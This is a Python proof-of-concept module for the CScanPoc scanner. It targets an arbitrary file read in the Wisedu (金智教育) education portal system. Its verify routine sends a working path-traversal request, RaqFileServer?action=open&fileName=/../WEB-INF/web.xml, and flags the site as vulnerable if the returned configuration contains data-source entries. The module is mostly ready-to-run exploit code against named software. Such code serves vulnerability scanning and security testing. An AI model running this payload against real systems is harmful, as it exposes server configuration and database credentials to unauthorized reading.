# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Wisedu_0002' # 平台漏洞编号，留空
    name = '金智教育门户信息系统存在任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        江苏金智教育门户信息系统存在任意文件读取漏洞。
        /epstar/servlet/RaqFileServer?action=
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '金智教育CMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1f51845c-ec3e-47d1-b53a-cf09ae493349'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #Refer:http://www.wooyun.org/bugs/wooyun-2015-0121332
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = arg + "/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml"
            code, head, res, errcode, _ = hh.http(payload)

            if code ==200 and 'logConfig' in res and 'dataSource' in res:
                #security_info(payload+':Any reading ' )
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
